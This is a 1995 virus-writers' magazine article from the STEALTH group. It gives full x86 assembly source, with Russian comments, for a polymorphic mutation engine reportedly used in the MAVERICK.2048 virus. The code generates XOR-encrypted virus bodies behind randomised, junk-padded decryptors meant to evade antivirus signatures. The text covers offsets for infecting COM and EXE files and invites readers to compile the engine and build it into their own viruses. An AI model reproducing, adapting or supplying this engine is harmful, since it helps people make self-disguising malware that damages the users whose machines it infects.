          ▄▄                  █
         ▀▀▀ Monthly Magazine █ For VirMakers.                  FEB '95
 	 ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  ██▀▀▀██  
	  ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   ██ ▀▀██
	   █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     ████ ██
	   █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  ██▄▄▄██
	   ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄ 
	     Copyright , (C),1994-95, by STEALTH group, unLtd.
	     (M)ail: BOX 10, KIEV 148, The CUNTry of fUcKRAINE	

		VIRUS WRITER'S NOTES.

	Долго я думал, что бы такого интересненького вставить в этот
номер, и придумал! То, что вы видите ниже, является первой авторской
попыткой реализации MUTATION ENGINE, поэтому просьба - строго не су-
дить.Это уже было опробовано в MAVERICK.2048 (по классификации Игоря
Данилова).  Описанная процедура создаёт зашифрованный код со следую-
щей структурой:
		 PUSH CS
		 POP  DS
;---------------------------------------------------------
;	"Случайные" команды - N слов. N от 1 до 16.
;	Будут встречаться после каждых последующих 3 байт!
;---------------------------------------------------------
		 MOV  SI(DI),cмещение MAIN_CODE
;---------------------------------------------------------
		 MOV  CX,длина шифруемого кода
;---------------------------------------------------------
		 MOV  BX,XXXX 
;---------------------------------------------------------
DECODE:
		 XOR  WORD PTR DS:[SI(DI)],BX
		 INC  SI(DI)
;---------------------------------------------------------
		 SUB  BX,YYYY
;---------------------------------------------------------
		 INC  SI(DI)
		 LOOP DECODE
;---------------------------------------------------------
MAIN_CODE:
		 Зашифрованный код...


	У меня была мысль поставлять данный продукт в "классическом"
виде ( OBJ - модуль  с примером его использования ), но я решил, что
будет лучше, если каждый из вас сможет внести свои изменения,  доба-
вить что-то новое, а, возможно, найдёт и более красивое решение!
	 Тот, кому скучно смотреть на код пусть просто откомпилирует
и запустит пример.  В каждом из 10 получившихся файлов содержится не
только инсталлятор и код, выводящий текстовую строку, но и сам MUTA-
TION ENGINE...
	
MODUL   PROC NEAR
;---------------------------------------------------------
;	Процедура, создающая шифрованный модуль.
;
;	ПАРАМЕТРЫ ПРИ ВЫЗОВЕ:
;	ES - указывает на буфер необходимого размера.
;	DS - указывает на сегмент шифруемого кода.
;	SI - смещение PATTERN.
;	RES_INST указывает на PATTERN.
;	По смещению FCONST в сегменте DS - смещение в файле (объяснения ниже...)
;
;	НА ВЫХОДЕ:
;	По адресу ЕS:0 - зашифрованный код.
;	DI - длина этого кода.
;---------------------------------------------------------
	IN   AX,40h			; Загнать в AX псевдослучайное слово.
;---------------------------------------------------------
	MOV  BYTE PTR DS:[SI],0BEh	; Первый байт команды MOV SI,...
	MOV  BYTE PTR DS:[SI+0Ah],01Ch  ; Кусочек команды XOR word ptr [SI],BX
	MOV  BYTE PTR DS:[SI+0Bh],046h  ; INC SI
	MOV  BYTE PTR DS:[SI+0Dh],0EBh  ; Первый байт команды SUB BX,...
	MOV  BYTE PTR DS:[SI+0Fh],046h  ; INC SI
;---------------------------------------------------------
	TEST AH,00000001b
	JNZ  LET_SI			; Оставляем вариант инсталлятора с SI.
;--------------------------------------------------------------
; Пользуясь тем, что коды идут подряд, везде меняем SI на DI.
;--------------------------------------------------------------
	INC  BYTE PTR DS:[SI]
	INC  BYTE PTR DS:[SI+0Ah]
	INC  BYTE PTR DS:[SI+0Bh]
	INC  BYTE PTR DS:[SI+0Fh]
;----------------------------------------------------------------------
LET_SI:
	MOV  WORD PTR DS:[SI+07h],AX ; С этим словом будем XORить.
;----------------------------------------------------------------------
	MOV  BYTE PTR DS:[SI+0Eh],AL ; Байтик для команды SUB BX,X
	TEST AH,00000010b
	CBW			  ; Important!!!
	JNZ  LET_SUB		  ; Будем ли менять в инсталляторе SUB на ADD?
;---------------------------------------------------------
;	Замена с коррекцией магического числа.
;---------------------------------------------------------
	MOV  BYTE PTR DS:[SI+0Dh],0C3h
	NEG  AX
;---------------------------------------------------------
LET_SUB:
	PUSH AX			     ; Запомним то,что будем вычитать.
	IN   AX,40h		     ; Новая затравка...
	AND  AX,00001111b
	INC  AX			     ; AX от 1 до 16...
				     ; Число "cлучайных" слов после
				     ; каждых 3 байт инсталлятора...

	ADD  WORD PTR DS:[SI+04h],AX ; А это, чтобы в инсталляторе не
				     ; встречались константы.

	SHL  AL,1                    ; Число "случайных" байт после каждых
				     ; 3 неслучайных.
	POP  DX			     ; То, что будем вычитать...
	PUSH AX			     ; Запомним смещение MOV SI(DI),XX - 2
	PUSH DX			     ; Опять запомним...
	MOV  DX,AX		     ; Кол-во "случайных" байт после каждых
				     ; 3 неслучайных.
;-----------------------------------------------------------
;	Вычисление адреса перехода для LOOP.
;-----------------------------------------------------------
	MOV  BL,0F7h
	SHL  AL,1
	SUB  BL,AL
	MOV  BYTE PTR DS:[SI+11h],BL ; LOOP
;-----------------------------------------------------------
	MOV  CX,07h		     ; Кол-во блоков cлучайные байты +
				     ; неслучайные.
	XOR  DI,DI		     ; NO COMMENT ;)
;--------------------------------------------------------------------
;	Первые команды инсталлятора - PUSH CS, POP DS.
;	Если пишем вирус, заражающий только COM, следующие
;	две команды можно убрать.
;--------------------------------------------------------------------
	MOV  AX,01F0Eh
	STOSW
;--------------------------------------------------------------------
COPY_0:
	PUSH CX
	PUSH SI
	CALL POLY	; Процедурка, генерирующая DX случайных байт.
	POP  SI
	POP  CX

;--------------------------------------------------------------------
;	Копируем очередные три байта инсталлятора.
;--------------------------------------------------------------------
	MOVSW
	MOVSB
;--------------------------------------------------------------------
	LOOP COPY_0

	POP  DX		; Слово, которое вычитаем.
	SUB  DI,03h	; Мы скопировали на 3 байта больше. Это надо исправить!
	PUSH DI		; Coхраним длину инсталлятора.
	MOV  SI,STR	; Cмещение шифруемого кода.
	MOV  CX,VL	; Длина шифруемого кода.
;---------------------------------------------------------------------
;	Шифруем код...
;---------------------------------------------------------------------
	MOV  BX,DS:[RES_INST+07h] ; В BX - то, с чем будем шифровать.
COPY_2:
	LODSW
	XOR  AX,BX
	STOSW
	SUB  BX,DX
	LOOP COPY_2
;----------------------------------------------------------------------

;-------------------------------
;	Заканчиваем модуль...	
;-------------------------------
	POP  DX					; В DX - длина инсталлятора.
	ADD  DX,WORD PTR DS:[NEW_BYTES+14h]	; прибавим смещение в файле....
;-----------------------------------------------------------------------
;	НЕОБХОДИМЫЕ ПОЯСНЕНИЯ.
;	Смещение в файле (для вирусов,записывающихся в конец):
;	СOM файл - длина файла + 100h;
;	EXE файл - Новое значение IP.
;-----------------------------------------------------------------------
	POP  BX			; Смещение команды MOV SI(DI),XX - 2.
	MOV  ES:[BX+03h],DX	; Результирующее смещение - в инсталлятор,
				; вместо того самого XX!
	RET
MODUL	ENDP

poly	proc near
	call my_off		; Не пугайтесь - это НЕ рекурсия!
;----------------------------------------------------
data_1  db   045h,04dh,090h,0f5h,0f8h,0f9h,0fch,0fdh ; Однобайтовые команды.
data_2  db   03h,0bh,013h,01bh,023h,02bh,033h,08bh   ; Элементы двухбайтовых.
data_3  db   0c5h,0d5h,0e5h,0f5h,0cdh,0ddh,0edh,0fdh ; Элементы четырёхбайтовых.

	db   'ETERNAL MAVERICK mutation engine v 1.0.' ; (c) Не изменять!

;----------------------------------------------------
my_off:
	pop  si			; Теперь в SI - смещение data_1
	push di			; Запомним смещение, по которому будем
				; генерировать случайный код.
	mov  cx,dx		; Кол-во случайных байт.
;------------------------------------
;	Generate 1 byte commands
;------------------------------------
form_1:
	call init_bx
	mov  al,byte ptr ds:[bx+si]
	stosb
	loop form_1
;-------------------------------------
;	Generate 2 byte commands
;-------------------------------------
	add  si,08	; SI - указывает на data_2
	mov  cx,di	; В CX - точка "останова".
	pop  di		; Смещение, где генерируем случайный код.
	push di		; Запомним...
form_2:
	call init_bx
	test ah,00000010b
	jnz  poly_go_1	; Генерируем тут двухбайтовую команду или
			; оставляем однобайтовые?
	inc  di
	inc  di
	jmp  short poly_next
poly_go_1:
	mov  ax,0e800h
	add  ah,bl
	mov  al,byte ptr ds:[bx+si]
	stosw
poly_next:
	cmp  di,cx
	jb   form_2	; Если не дошли до точки останова, то продолжаем...
;-------------------------------------
;	Generate 4 byte commands
;-------------------------------------
	add  si,08h	; SI указывает на data_3.
	pop  di		; Cмещение, где генерируем случайный код.
form_3:
	call init_bx

	push cx
	sub  cx,di
	cmp  cx,4
	pop  cx

	jb   poly_stop ; Если меньше 4 байт до точки останова, то выход.

	test ah,00000001b
	jnz  poly_go_2	; Будем ли генерировать 4-х байтовую команду по
			; этому адресу?
	inc  di
	inc  di
	jmp  short form_3 ; Продолжаем...
poly_go_2:
	mov  al,81h
	mov  ah,byte ptr ds:[bx+si]
	stosw
	in   ax,40h	; Просто случайное слово!
	stosw
	jmp  short form_3
poly_stop:
	mov  di,cx	; Восстанавливаем DI, обязательно!
	ret
poly	endp

init_bx proc near
;---------------------------------------------
;	Процедурка, обеспечивающая в BX
;	псевдослучайное число от 0 до 7.
;---------------------------------------------
	in   ax,40h
	xor  bx,ax
	add  bx,di
	not  bx
	and  bx,00000111b
	ret
init_bx endp

;---------------------------------------------
;	Шаблон инсталлятора.
;---------------------------------------------
PATTERN:
	MOV  DI,0
	MOV  CX,VL
	MOV  BX,0E0Fh
	XOR  WORD PTR DS:[DI],BX
	INC DI
	SUB BX,0
	INC DI
	DB  0E2h,00h
;---------------------------------------------